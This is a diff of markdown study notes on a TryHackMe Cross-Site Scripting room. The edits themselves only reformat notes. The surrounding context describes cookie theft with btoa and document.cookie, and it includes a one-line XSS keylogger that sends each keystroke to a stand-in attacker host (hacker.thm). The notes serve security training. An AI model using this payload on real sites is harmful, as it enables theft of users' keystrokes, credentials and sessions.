@@ -2,6 +2,7 @@
 
 <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png" width="200" height="200" align="left">
 
+*[XSS]: Cross-Site Scripting
 # Cross-Site Scripting
 
 **Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor's browsers.**
@@ -44,7 +45,8 @@ btoa()
 
 : Is a function that accepts javascript string as an parameter and base64 encodes it in order to make it safe for a browser to transport. This along with the `document.cookie` parameter an attacker can steal a victims cookie session in order to login as that user without knowing the credentials.
 
-📰 **Note:** Javascript can be used in order to set a keylogger on the victim site thus giving the attacker the chance to passively gather user keystrokes with the goal of obtaining credentials. An example line for a XSS keylogger may look like this:
+!!! note
+    Javascript can be used in order to set a keylogger on the victim site thus giving the attacker the chance to passively gather user keystrokes with the goal of obtaining credentials. An example line for a XSS keylogger may look like this:
 
 ```js
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
@@ -88,7 +90,8 @@ The response from the web app to this link would look like this:
 <p>You searched for: <script>/* Bad stuff here... */</script></p>
 ```
 
-📰 **Note:** This sort of attack can be performed in numerous ways and creativity is key but it vulnerability will need modification depending on what sort of protection is in place on the web app itself so keep a lookout for any details that might give it away.
+!!! note
+     This sort of attack can be performed in numerous ways and creativity is key but it vulnerability will need modification depending on what sort of protection is in place on the web app itself so keep a lookout for any details that might give it away.
 
 ## Task 4 Stored XSS
 
@@ -121,7 +124,8 @@ XSSHunter
 
     Stored XSS
 
-📰 **Note:** Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+!!! note
+     Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
 
 ## Task 7 Perfecting your payload
 
